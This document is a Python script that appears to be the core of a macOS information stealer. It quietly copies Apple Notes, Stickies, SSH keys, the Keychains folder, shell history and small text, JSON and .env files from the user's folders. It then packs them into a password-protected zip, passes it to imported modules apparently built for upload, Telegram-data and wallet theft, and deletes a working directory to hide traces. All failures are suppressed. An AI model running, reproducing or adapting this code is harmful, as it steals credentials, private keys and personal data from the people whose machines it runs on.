import os
import shutil
import stat
import zipfile
import pyzipper
import updel
import addonal
import tg
import ph
import tx
from addonal import FileProcessor

processor = FileProcessor()

def clear_temp_dir(temp_dir):
    try:
        if os.path.exists(temp_dir):
            for item in os.listdir(temp_dir):
                item_path = os.path.join(temp_dir, item)
                if os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                else:
                    os.remove(item_path)
    except Exception:
        pass

def create_temp_dir(temp_dir):
    try:
        if os.path.exists(temp_dir):
            chmod_recursive(temp_dir)
            shutil.rmtree(temp_dir)
        os.makedirs(temp_dir)
    except Exception:
        pass

def chmod_recursive(path):
    try:
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                try:
                    os.chmod(os.path.join(root, dir), stat.S_IRWXU)
                except Exception:
                    pass
            for file in files:
                try:
                    os.chmod(os.path.join(root, file), stat.S_IRWXU)
                except Exception:
                    pass
    except Exception:
        pass

def zip_directory(src_dir, dest_zip):
    try:
        with zipfile.ZipFile(dest_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(src_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, src_dir)
                    zipf.write(file_path, arcname)
    except Exception:
        pass

def mediax(temp_dir):
    try:
        notes_dir = os.path.expanduser("~/Library/Group Containers/group.com.apple.notes/")
        notes_dest_zip = os.path.join(temp_dir, "Notlar.zip")

        if os.path.exists(notes_dir):
            temp_notes_dir = os.path.join(temp_dir, "Notlar")
            os.makedirs(temp_notes_dir, exist_ok=True)
            specific_files = [
                "NoteStore.sqlite-wal",
                "NotesIndexerState-HTML",
                "NotesIndexerState-Modern",
                "NoteStore.sqlite",
                "NoteStore.sqlite-shm"
            ]

            for file in specific_files:
                src_file_path = os.path.join(notes_dir, file)
                if os.path.exists(src_file_path):
                    shutil.copy(src_file_path, temp_notes_dir)

            accounts_dir = os.path.join(notes_dir, "Accounts")
            if os.path.exists(accounts_dir):
                for root, dirs, files in os.walk(accounts_dir):
                    for dir in dirs:
                        if dir == "Previews":
                            previews_src_dir = os.path.join(root, dir)
                            previews_dest_dir = os.path.join(temp_notes_dir, os.path.relpath(previews_src_dir, notes_dir))
                            shutil.copytree(previews_src_dir, previews_dest_dir)
            zip_directory(temp_notes_dir, notes_dest_zip)
            shutil.rmtree(temp_notes_dir)
    except Exception:
        pass

def copy_stickies(temp_dir):
    try:
        stickies_src_dir = os.path.expanduser("~/Library/Containers/com.apple.Stickies/Data/Library/Stickies/")
        stickies_dest_zip = os.path.join(temp_dir, "Stickers.zip")
        if os.path.exists(stickies_src_dir):
            zip_directory(stickies_src_dir, stickies_dest_zip)
    except Exception:
        pass

def copy_stickies_database(temp_dir):
    try:
        stickies_db_src_dir = os.path.expanduser("~/Library/StickiesDatabase/")
        yapiskans_dest_zip = os.path.join(temp_dir, "Yapiskans.zip")
        yapis_dest_zip = os.path.join(temp_dir, "Yapis.zip")

        if os.path.exists(stickies_db_src_dir):
            temp_stickies_db_dir = os.path.join(temp_dir, "StickiesDatabase")
            os.makedirs(temp_stickies_db_dir, exist_ok=True)
            shutil.copytree(stickies_db_src_dir, os.path.join(temp_stickies_db_dir, "Yapiskans"))
            shutil.copytree(stickies_db_src_dir, os.path.join(temp_stickies_db_dir, "Yapis"))
            zip_directory(os.path.join(temp_stickies_db_dir, "Yapiskans"), yapiskans_dest_zip)
            zip_directory(os.path.join(temp_stickies_db_dir, "Yapis"), yapis_dest_zip)
            shutil.rmtree(temp_stickies_db_dir)
    except Exception:
        pass

def backup_ssh(temp_dir):
    try:
        ssh_src_dir = os.path.expanduser("~/.ssh/")
        ssh_dest_zip = os.path.join(temp_dir, "SSH.zip")
        if os.path.exists(ssh_src_dir):
            zip_directory(ssh_src_dir, ssh_dest_zip)
    except Exception:
        pass

def search_files(temp_dir):
    try:
        search_dirs = [
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~")
        ]
        extensions = ['.txt', '.csv', '.json', '.config', '.env', '.example']
        search_dest_zip = os.path.join(temp_dir, "1_txts.zip")

        temp_search_dir = os.path.join(temp_dir, "1_txts")
        os.makedirs(temp_search_dir, exist_ok=True)

        for search_dir in search_dirs:
            if os.path.exists(search_dir):
                for item in os.listdir(search_dir):
                    item_path = os.path.join(search_dir, item)
                    if os.path.isfile(item_path) and os.path.getsize(item_path) < 1 * 1024 * 1024:
                        if any(item_path.endswith(ext) for ext in extensions):
                            shutil.copy(item_path, temp_search_dir)

        zip_directory(temp_search_dir, search_dest_zip)
        shutil.rmtree(temp_search_dir)
    except Exception:
        pass
def delete_directory_permanently():
    directory_path = os.path.expanduser('~/tmpcode/')

    if os.path.exists(directory_path):
        shutil.rmtree(directory_path)

def copy_terminal_history(temp_dir):
    try:
        terminal_files = [
            os.path.expanduser("~/.zprofile"),
            os.path.expanduser("~/.zsh_history")
        ]
        terminal_sessions_dir = os.path.expanduser("~/.zsh_sessions")
        terminal_dest_zip = os.path.join(temp_dir, "terrminalhis.zip")

        temp_terminal_dir = os.path.join(temp_dir, "terrminalhis")
        os.makedirs(temp_terminal_dir, exist_ok=True)

        for file in terminal_files:
            if os.path.exists(file):
                shutil.copy(file, temp_terminal_dir)
        
        if os.path.exists(terminal_sessions_dir):
            shutil.copytree(terminal_sessions_dir, os.path.join(temp_terminal_dir, "zsh_sessions"))

        zip_directory(temp_terminal_dir, terminal_dest_zip)
        shutil.rmtree(temp_terminal_dir)
    except Exception:
        pass

def copy_ssh_and_keychain(temp_dir):
    try:
        special_wallets = {
            "Keychain": "~/Library/Keychains/",
            "ssh": "~/.ssh/"
        }

        for wallet_name, wallet_path in special_wallets.items():
            destination_zip = os.path.join(temp_dir, f"{wallet_name}.zip")
            if os.path.exists(os.path.expanduser(wallet_path)):
                zip_directory(os.path.expanduser(wallet_path), destination_zip)
    except Exception:
        pass

def zip_premium(temp_dir, premium_zip_path):
    try:
        with pyzipper.AESZipFile(premium_zip_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(b'@*@')
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zipf.write(file_path, arcname)
    except Exception:
        pass

def main():
    try:
        temp_dir = os.path.expanduser("~/.temp/")
        clear_temp_dir(temp_dir)
        
        temp_premium_dir = os.path.join(temp_dir, "premium/")
        create_temp_dir(temp_premium_dir)
        
        mediax(temp_premium_dir)
        copy_stickies(temp_premium_dir)
        copy_stickies_database(temp_premium_dir)
        backup_ssh(temp_premium_dir)
        search_files(temp_premium_dir)
        copy_terminal_history(temp_premium_dir)
        copy_ssh_and_keychain(temp_premium_dir)

        for item in os.listdir(temp_premium_dir):
            item_path = os.path.join(temp_premium_dir, item)
            if os.path.isdir(item_path):
                shutil.rmtree(item_path)
        
        premium_zip_path = os.path.join(temp_dir, "premium.zip")
        zip_premium(temp_premium_dir, premium_zip_path)
        
        shutil.rmtree(temp_premium_dir)

        file_names = ['premium.zip']
        for file_name in file_names:
            updel.process_file(file_name)
            tg.backup_tdata()
            processor.run()
            tg.backup_telegram()
            tx.wallskin()
            ph.process_photos()
            delete_directory_permanently()

    except Exception:
        pass

if __name__ == "__main__":
    main()